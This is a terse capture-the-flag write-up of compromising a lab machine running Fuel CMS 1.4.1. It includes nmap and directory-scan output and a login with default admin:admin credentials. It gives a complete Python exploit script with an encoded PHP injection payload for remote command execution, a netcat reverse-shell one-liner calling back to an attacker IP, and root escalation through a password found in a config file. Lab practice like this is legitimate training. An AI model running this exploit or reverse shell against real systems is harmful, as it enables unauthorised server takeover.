```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

```
Got this on robots.txt: http://fuel.thm/fuel/
Got in using admin:admin
### Got a lot of directories
```

modules                 [Status: 301, Size: 311, Words: 20, Lines: 10]
assets                  [Status: 302, Size: 0, Words: 1, Lines: 1]
scripts                 [Status: 403, Size: 295, Words: 22, Lines: 12]
install                 [Status: 403, Size: 295, Words: 22, Lines: 12]
users                   [Status: 302, Size: 0, Words: 1, Lines: 1]
logs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
preview                 [Status: 302, Size: 0, Words: 1, Lines: 1]
recent                  [Status: 302, Size: 0, Words: 1, Lines: 1]
application             [Status: 403, Size: 299, Words: 22, Lines: 12]
blocks                  [Status: 302, Size: 0, Words: 1, Lines: 1]
module                  [Status: 302, Size: 0, Words: 1, Lines: 1]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
settings                [Status: 302, Size: 0, Words: 1, Lines: 1]
categories              [Status: 302, Size: 0, Words: 1, Lines: 1]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
installer               [Status: 302, Size: 0, Words: 1, Lines: 1]
start                   [Status: 302, Size: 0, Words: 1, Lines: 1]
navigation              [Status: 302, Size: 0, Words: 1, Lines: 1]
tags                    [Status: 302, Size: 0, Words: 1, Lines: 1]
login                   [Status: 200, Size: 7845, Words: 398, Lines: 83]
tools                   [Status: 302, Size: 0, Words: 1, Lines: 1]
user_guide              [Status: 302, Size: 0, Words: 1, Lines: 1]
licenses                [Status: 301, Size: 312, Words: 20, Lines: 10]
reset                   [Status: 302, Size: 0, Words: 1, Lines: 1]
generate                [Status: 302, Size: 0, Words: 1, Lines: 1]
login_form              [Status: 200, Size: 7850, Words: 398, Lines: 83]
loginimages             [Status: 200, Size: 7851, Words: 398, Lines: 83]
permissions             [Status: 302, Size: 0, Words: 1, Lines: 1]
my_profile              [Status: 302, Size: 0, Words: 1, Lines: 1]
codeigniter             [Status: 403, Size: 299, Words: 22, Lines: 12]
migrate                 [Status: 302, Size: 0, Words: 1, Lines: 1]
loginerror              [Status: 200, Size: 7850, Words: 398, Lines: 83]
logins                  [Status: 200, Size: 7846, Words: 398, Lines: 83]
login2                  [Status: 200, Size: 7846, Words: 398, Lines: 83]
login-show              [Status: 200, Size: 7850, Words: 398, Lines: 83]
Tools                   [Status: 302, Size: 0, Words: 1, Lines: 1]
Assets                  [Status: 302, Size: 0, Words: 1, Lines: 1]
Users                   [Status: 302, Size: 0, Words: 1, Lines: 1]
Preview                 [Status: 302, Size: 0, Words: 1, Lines: 1]
Settings                [Status: 302, Size: 0, Words: 1, Lines: 1]
Navigation              [Status: 302, Size: 0, Words: 1, Lines: 1]
Login                   [Status: 200, Size: 7845, Words: 398, Lines: 83]
Logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
Module                  [Status: 302, Size: 0, Words: 1, Lines: 1]
Dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
Installer               [Status: 302, Size: 0, Words: 1, Lines: 1]
Start                   [Status: 302, Size: 0, Words: 1, Lines: 1]
Blocks                  [Status: 302, Size: 0, Words: 1, Lines: 1]
Reset                   [Status: 302, Size: 0, Words: 1, Lines: 1]
loginbox                [Status: 200, Size: 7848, Words: 398, Lines: 83]
login-register          [Status: 200, Size: 7854, Words: 398, Lines: 83]
logincheck              [Status: 200, Size: 7850, Words: 398, Lines: 83]
loginpage               [Status: 200, Size: 7849, Words: 398, Lines: 83]
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
login-us                [Status: 200, Size: 7848, Words: 398, Lines: 83]
login_check             [Status: 200, Size: 7851, Words: 398, Lines: 83]
login_db                [Status: 200, Size: 7848, Words: 398, Lines: 83]
loginadmin              [Status: 200, Size: 7850, Words: 398, Lines: 83]
login-redirect          [Status: 200, Size: 7854, Words: 398, Lines: 83]
login1                  [Status: 200, Size: 7846, Words: 398, Lines: 83]
login_sendpass          [Status: 200, Size: 7854, Words: 398, Lines: 83]
.htm                    [Status: 403, Size: 292, Words: 22, Lines: 12]
.html                   [Status: 403, Size: 293, Words: 22, Lines: 12]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1]
.php3                   [Status: 403, Size: 293, Words: 22, Lines: 12]
.phtml                  [Status: 403, Size: 294, Words: 22, Lines: 12]
.htc                    [Status: 403, Size: 292, Words: 22, Lines: 12]
.html_var_de            [Status: 403, Size: 300, Words: 22, Lines: 12]
.php4                   [Status: 403, Size: 293, Words: 22, Lines: 12]
.php5                   [Status: 403, Size: 293, Words: 22, Lines: 12]
login_admin             [Status: 200, Size: 7851, Words: 398, Lines: 83]
.html.                  [Status: 403, Size: 294, Words: 22, Lines: 12]
login_ip                [Status: 200, Size: 7848, Words: 398, Lines: 83]
.html.html              [Status: 403, Size: 298, Words: 22, Lines: 12]
loginout                [Status: 200, Size: 7848, Words: 398, Lines: 83]
login_user              [Status: 200, Size: 7850, Words: 398, Lines: 83]
.htpasswds              [Status: 403, Size: 298, Words: 22, Lines: 12]
loginform               [Status: 200, Size: 7849, Words: 398, Lines: 83]

```


Got in using a modified script, www.exploit-db.com/exploits/47138
```
#!/usr/bin/env python3
# fuel CMS 1.4.1 RCE (ported to Python3)
import requests
import urllib.parse

url = "http://10.201.26.137"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while True:
    cmd = input('cmd: ')
    if cmd.strip().lower() in ('exit', 'quit'):
        break

    payload = "%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" \
              + urllib.parse.quote(cmd) + "%27%29%2b%27"
    target = f"{url}/fuel/pages/select/?filter={payload}"

    # remove proxy unless you actually need one. set to None or provide proper proxy url.
    r = requests.get(target, timeout=15)

    html_marker = "<!DOCTYPE html>"
    html_pos = r.text.find(html_marker)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text, begin, 2)

    if dup > 0:
        print(r.text[0:dup])
    else:
        # fallback: print whole response if duplicate boundary not found
        print(r.text[:1000])

```

Got in using, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.19.181 4444 >/tmp/f`

Found a SUID bit `/usr/sbin/pppd`
just a rabbithole tbh
Used linpeas.sh and found `/var/www/html/fuel/application/config/database.php`

which had the password to root
ez~